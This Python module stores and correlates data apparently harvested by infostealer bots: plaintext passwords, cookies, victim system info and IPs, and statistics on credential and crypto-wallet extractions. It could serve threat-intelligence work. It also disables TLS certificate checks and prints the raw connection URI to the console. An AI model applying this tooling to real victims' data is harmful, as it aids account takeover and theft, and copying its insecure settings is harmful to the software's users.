"""
Elasticsearch client for log correlation and data analysis.

This module handles the connection to Elasticsearch and provides methods for
storing, retrieving, and analyzing intercepted data.
"""

import logging
import os  # Import os module
from datetime import datetime, timedelta
from typing import Dict, List, Any
from urllib.parse import urlparse # Added import

from elasticsearch import AsyncElasticsearch
from elasticsearch.helpers import async_bulk

from config.settings import config

logger = logging.getLogger(__name__)

class ElasticsearchManager:
    """Manages Elasticsearch connections and operations."""
    
    def __init__(self):
        """Initialize Elasticsearch manager."""
        self.config = config.elasticsearch
        
        # --- Explicitly read auth from environment variables ---
        es_username = os.getenv("ELASTICSEARCH_USERNAME")
        es_password = os.getenv("ELASTICSEARCH_PASSWORD")
        auth_params = {}
        if es_username and es_password:
            auth_params['basic_auth'] = (es_username, es_password)
            logger.info("Using Elasticsearch Basic authentication.")
        else:
            logger.info("No explicit Elasticsearch authentication credentials found in environment.")

        # --- Parse the URI to separate endpoint from potential inline auth ---
        # logger.debug(f"Raw Elasticsearch URI from config: {self.config.uri}") # Keep this for now
        print(f"!!! DEBUG: Raw Elasticsearch URI before parse: {self.config.uri}") # <-- ADDED PRINT
        parsed_uri = urlparse(self.config.uri)
        print(f"!!! DEBUG: Parsed scheme: {parsed_uri.scheme}") # <-- ADDED PRINT
        host_uri = f"{parsed_uri.scheme}://{parsed_uri.hostname}:{parsed_uri.port}"
        logger.info(f"Connecting to Elasticsearch endpoint: {host_uri}")

        self.client = AsyncElasticsearch(
            [host_uri],         # Use parsed URI without inline auth
            verify_certs=False, # Disable SSL verification for self-signed certs
            **auth_params       # Pass basic auth credentials separately
        )
        
        # Index names
        self.credentials_index = f"{self.config.index_prefix}-credentials"
        self.cookies_index = f"{self.config.index_prefix}-cookies"
        self.system_info_index = f"{self.config.index_prefix}-system-info"
        self.logs_index = f"{self.config.index_prefix}-logs"
        self.correlation_index = f"{self.config.index_prefix}-correlation"
        self.stats_index = f"{self.config.index_prefix}-parser-stats"
        
    async def initialize(self):
        """Initialize Elasticsearch indices and templates."""
        # Check if Elasticsearch is available
        try:
            if not await self.client.ping():
                logger.warning("Elasticsearch is not available")
                return False
                
            logger.info("Elasticsearch is available")
            
            # Create indices with mappings
            await self._create_indices()
            
            return True
        except Exception as e:
            logger.error(f"Failed to initialize Elasticsearch: {str(e)}")
            return False
            
    async def _create_indices(self):
        """Create Elasticsearch indices with appropriate mappings."""
        # Credentials index
        credentials_mapping = {
            "mappings": {
                "properties": {
                    "username": {"type": "keyword"},
                    "password": {"type": "keyword"},
                    "domain": {"type": "keyword"},
                    "bot_id": {"type": "keyword"},
                    "bot_username": {"type": "keyword"},
                    "message_id": {"type": "keyword"},
                    "timestamp": {"type": "date"},
                    "source_ip": {"type": "ip"}
                }
            },
            "settings": {
                "number_of_shards": 1,
                "number_of_replicas": 1
            }
        }
        
        await self._create_index_if_not_exists(self.credentials_index, credentials_mapping)
        
        # Cookies index
        cookies_mapping = {
            "mappings": {
                "properties": {
                    "domain": {"type": "keyword"},
                    "value": {"type": "text"},
                    "bot_id": {"type": "keyword"},
                    "bot_username": {"type": "keyword"},
                    "message_id": {"type": "keyword"},
                    "timestamp": {"type": "date"},
                    "source_ip": {"type": "ip"}
                }
            },
            "settings": {
                "number_of_shards": 1,
                "number_of_replicas": 1
            }
        }
        
        await self._create_index_if_not_exists(self.cookies_index, cookies_mapping)
        
        # System info index
        system_info_mapping = {
            "mappings": {
                "properties": {
                    "os": {"type": "text"},
                    "hardware": {"type": "text"},
                    "ip": {"type": "ip"},
                    "full_info": {"type": "text"},
                    "bot_id": {"type": "keyword"},
                    "bot_username": {"type": "keyword"},
                    "message_id": {"type": "keyword"},
                    "timestamp": {"type": "date"}
                }
            },
            "settings": {
                "number_of_shards": 1,
                "number_of_replicas": 1
            }
        }
        
        await self._create_index_if_not_exists(self.system_info_index, system_info_mapping)
        
        # Logs index
        logs_mapping = {
            "mappings": {
                "properties": {
                    "bot_id": {"type": "keyword"},
                    "bot_username": {"type": "keyword"},
                    "message_id": {"type": "keyword"},
                    "timestamp": {"type": "date"},
                    "event_type": {"type": "keyword"},
                    "details": {"type": "text"}
                }
            },
            "settings": {
                "number_of_shards": 1,
                "number_of_replicas": 1
            }
        }
        
        await self._create_index_if_not_exists(self.logs_index, logs_mapping)
        
        # Correlation index
        correlation_mapping = {
            "mappings": {
                "properties": {
                    "bot_id": {"type": "keyword"},
                    "user_id": {"type": "keyword"},
                    "ip_address": {"type": "ip"},
                    "domains": {"type": "keyword"},
                    "timestamp": {"type": "date"},
                    "correlation_type": {"type": "keyword"},
                    "confidence": {"type": "float"},
                    "details": {"type": "object"}
                }
            },
            "settings": {
                "number_of_shards": 1,
                "number_of_replicas": 1
            }
        }
        
        await self._create_index_if_not_exists(self.correlation_index, correlation_mapping)
        
        # Parser stats index
        stats_mapping = {
            "mappings": {
                "properties": {
                    "type": {"type": "keyword"},
                    "timestamp": {"type": "date"},
                    "total_processed": {"type": "integer"},
                    "successful_credential_extractions": {"type": "integer"},
                    "successful_cookie_extractions": {"type": "integer"},
                    "successful_crypto_wallet_extractions": {"type": "integer"},
                    "high_value_extractions": {"type": "integer"},
                    "plugin_successes": {"type": "integer"},
                    "plugin_failures": {"type": "integer"},
                    "overall_success_rate": {"type": "float"},
                    "plugin_data": {"type": "object"}
                }
            },
            "settings": {
                "number_of_shards": 1,
                "number_of_replicas": 1
            }
        }
        
        await self._create_index_if_not_exists(self.stats_index, stats_mapping)
        
    async def _create_index_if_not_exists(self, index_name: str, mapping: Dict[str, Any]):
        """
        Create an Elasticsearch index if it doesn't exist.
        
        Args:
            index_name: Name of the index
            mapping: Index mapping and settings
        """
        try:
            # Check if index exists
            if not await self.client.indices.exists(index=index_name):
                # Create index
                await self.client.indices.create(index=index_name, body=mapping)
                logger.info(f"Created Elasticsearch index {index_name}")
            else:
                logger.debug(f"Elasticsearch index {index_name} already exists")
        except Exception as e:
            logger.error(f"Failed to create Elasticsearch index {index_name}: {str(e)}")
            
    async def index_credential(self, credential_data: Dict[str, Any]) -> str:
        """
        Index a credential in Elasticsearch.
        
        Args:
            credential_data: Credential data
            
        Returns:
            ID of the indexed document
        """
        try:
            # Ensure timestamp field
            if "timestamp" not in credential_data:
                credential_data["timestamp"] = datetime.utcnow()
                
            # Index document
            result = await self.client.index(
                index=self.credentials_index,
                document=credential_data
            )
            
            return result["_id"]
        except Exception as e:
            logger.error(f"Failed to index credential: {str(e)}")
            raise
            
    async def index_cookie(self, cookie_data: Dict[str, Any]) -> str:
        """
        Index a cookie in Elasticsearch.
        
        Args:
            cookie_data: Cookie data
            
        Returns:
            ID of the indexed document
        """
        try:
            # Ensure timestamp field
            if "timestamp" not in cookie_data:
                cookie_data["timestamp"] = datetime.utcnow()
                
            # Index document
            result = await self.client.index(
                index=self.cookies_index,
                document=cookie_data
            )
            
            return result["_id"]
        except Exception as e:
            logger.error(f"Failed to index cookie: {str(e)}")
            raise
            
    async def index_system_info(self, system_data: Dict[str, Any]) -> str:
        """
        Index system information in Elasticsearch.
        
        Args:
            system_data: System data
            
        Returns:
            ID of the indexed document
        """
        try:
            # Ensure timestamp field
            if "timestamp" not in system_data:
                system_data["timestamp"] = datetime.utcnow()
                
            # Index document
            result = await self.client.index(
                index=self.system_info_index,
                document=system_data
            )
            
            return result["_id"]
        except Exception as e:
            logger.error(f"Failed to index system info: {str(e)}")
            raise
            
    async def log_activity(self, log_data: Dict[str, Any]) -> str:
        """
        Log bot activity in Elasticsearch.
        
        Args:
            log_data: Log data
            
        Returns:
            ID of the indexed document
        """
        try:
            # Ensure timestamp field
            if "timestamp" not in log_data:
                log_data["timestamp"] = datetime.utcnow()
                
            # Index document
            result = await self.client.index(
                index=self.logs_index,
                document=log_data
            )
            
            return result["_id"]
        except Exception as e:
            logger.error(f"Failed to log activity: {str(e)}")
            raise
            
    async def create_correlation(self, correlation_data: Dict[str, Any]) -> str:
        """
        Create a correlation in Elasticsearch.
        
        Args:
            correlation_data: Correlation data
            
        Returns:
            ID of the indexed document
        """
        try:
            # Ensure timestamp field
            if "timestamp" not in correlation_data:
                correlation_data["timestamp"] = datetime.utcnow()
                
            # Index document
            result = await self.client.index(
                index=self.correlation_index,
                document=correlation_data
            )
            
            return result["_id"]
        except Exception as e:
            logger.error(f"Failed to create correlation: {str(e)}")
            raise
            
    async def search_credentials(self, query: Dict[str, Any], size: int = 100) -> List[Dict[str, Any]]:
        """
        Search for credentials in Elasticsearch.
        
        Args:
            query: Elasticsearch query
            size: Maximum number of results
            
        Returns:
            List of matching credentials
        """
        try:
            result = await self.client.search(
                index=self.credentials_index,
                body={"query": query},
                size=size
            )
            
            return [hit["_source"] for hit in result["hits"]["hits"]]
        except Exception as e:
            logger.error(f"Failed to search credentials: {str(e)}")
            return []
            
    async def correlate_data(self, bot_id: str, hours: int = 24) -> List[Dict[str, Any]]:
        """
        Correlate data from different indices.
        
        Args:
            bot_id: Bot ID
            hours: Number of hours to look back
            
        Returns:
            List of correlation results
        """
        try:
            start_time = datetime.utcnow() - timedelta(hours=hours)
            
            # Find all system info records for this bot
            system_info_query = {
                "bool": {
                    "must": [
                        {"term": {"bot_id": bot_id}},
                        {"range": {"timestamp": {"gte": start_time.isoformat()}}}
                    ]
                }
            }
            
            system_info_result = await self.client.search(
                index=self.system_info_index,
                body={"query": system_info_query},
                size=100
            )
            
            system_info_records = [hit["_source"] for hit in system_info_result["hits"]["hits"]]
            
            # Find all credentials for this bot
            credentials_query = {
                "bool": {
                    "must": [
                        {"term": {"bot_id": bot_id}},
                        {"range": {"timestamp": {"gte": start_time.isoformat()}}}
                    ]
                }
            }
            
            credentials_result = await self.client.search(
                index=self.credentials_index,
                body={"query": credentials_query},
                size=100
            )
            
            credential_records = [hit["_source"] for hit in credentials_result["hits"]["hits"]]
            
            # Build correlations
            correlations = []
            
            # Group credentials by domain
            domain_credentials = {}
            for credential in credential_records:
                domain = credential.get("domain")
                if domain:
                    if domain not in domain_credentials:
                        domain_credentials[domain] = []
                    domain_credentials[domain].append(credential)
                    
            # Create domain-based correlations
            for domain, credentials in domain_credentials.items():
                if len(credentials) > 1:
                    # Multiple credentials for the same domain
                    correlation = {
                        "bot_id": bot_id,
                        "correlation_type": "multiple_credentials_same_domain",
                        "timestamp": datetime.utcnow(),
                        "domains": [domain],
                        "confidence": 0.8,
                        "details": {
                            "credential_count": len(credentials),
                            "credential_ids": [cred.get("_id", "unknown") for cred in credentials]
                        }
                    }
                    correlations.append(correlation)
                    
            # Correlate system info with credentials
            for system_info in system_info_records:
                ip = system_info.get("ip")
                if ip:
                    correlation = {
                        "bot_id": bot_id,
                        "correlation_type": "system_info_with_credentials",
                        "timestamp": datetime.utcnow(),
                        "ip_address": ip,
                        "domains": list(domain_credentials.keys()),
                        "confidence": 0.9,
                        "details": {
                            "system_info_id": system_info.get("_id", "unknown"),
                            "credential_count": sum(len(creds) for creds in domain_credentials.values()),
                            "os": system_info.get("os")
                        }
                    }
                    correlations.append(correlation)
                    
            # Save correlations
            if correlations:
                # Bulk index correlations
                bulk_operations = []
                for correlation in correlations:
                    bulk_operations.append({
                        "_index": self.correlation_index,
                        "_source": correlation
                    })
                    
                await async_bulk(self.client, bulk_operations)
                
            return correlations
        except Exception as e:
            logger.error(f"Failed to correlate data: {str(e)}")
            return []
            
    async def index_parser_stats(self, stats_data: Dict[str, Any]) -> str:
        """
        Index parser statistics in Elasticsearch.
        
        Args:
            stats_data: Parser statistics data
            
        Returns:
            ID of the indexed document
        """
        try:
            # Create document with flattened structure for better querying
            stats_doc = {
                "type": "parser_stats",
                "timestamp": datetime.utcnow(),
                "total_processed": stats_data.get("total_processed", 0),
                "successful_credential_extractions": stats_data.get("successful_credential_extractions", 0),
                "successful_cookie_extractions": stats_data.get("successful_cookie_extractions", 0),
                "successful_crypto_wallet_extractions": stats_data.get("successful_crypto_wallet_extractions", 0),
                "high_value_extractions": stats_data.get("high_value_extractions", 0),
                "plugin_successes": stats_data.get("plugin_successes", 0),
                "plugin_failures": stats_data.get("plugin_failures", 0),
                "overall_success_rate": stats_data.get("overall_success_rate", 0),
                "plugin_data": stats_data.get("plugins", {})
            }
            
            # Index document
            result = await self.client.index(
                index=self.stats_index,
                document=stats_doc
            )
            
            return result["_id"]
        except Exception as e:
            logger.error(f"Failed to index parser stats: {str(e)}")
            raise
            
    async def get_parser_stats_trends(self, days: int = 7) -> Dict[str, Any]:
        """
        Get parser statistics trends over time.
        
        Args:
            days: Number of days to look back
            
        Returns:
            Dictionary with trend data
        """
        try:
            start_time = datetime.utcnow() - timedelta(days=days)
            
            # Aggregation to get daily stats
            query = {
                "query": {
                    "bool": {
                        "must": [
                            {"term": {"type": "parser_stats"}},
                            {"range": {"timestamp": {"gte": start_time.isoformat()}}}
                        ]
                    }
                },
                "aggs": {
                    "stats_per_day": {
                        "date_histogram": {
                            "field": "timestamp",
                            "calendar_interval": "day"
                        },
                        "aggs": {
                            "total_processed": {"avg": {"field": "total_processed"}},
                            "success_rate": {"avg": {"field": "overall_success_rate"}},
                            "high_value": {"avg": {"field": "high_value_extractions"}},
                            "plugin_successes": {"avg": {"field": "plugin_successes"}}
                        }
                    },
                    "top_plugins": {
                        "terms": {
                            "field": "plugin_data.*.success_rate",
                            "size": 5,
                            "order": {"_key": "desc"}
                        }
                    }
                },
                "size": 0
            }
            
            result = await self.client.search(
                index=self.stats_index,
                body=query
            )
            
            return {
                "daily_trends": result.get("aggregations", {}).get("stats_per_day", {}).get("buckets", []),
                "top_plugins": result.get("aggregations", {}).get("top_plugins", {}).get("buckets", [])
            }
        except Exception as e:
            logger.error(f"Failed to get parser stats trends: {str(e)}")
            return {"daily_trends": [], "top_plugins": []}
            
    async def close(self):
        """Close Elasticsearch connection."""
        await self.client.close()
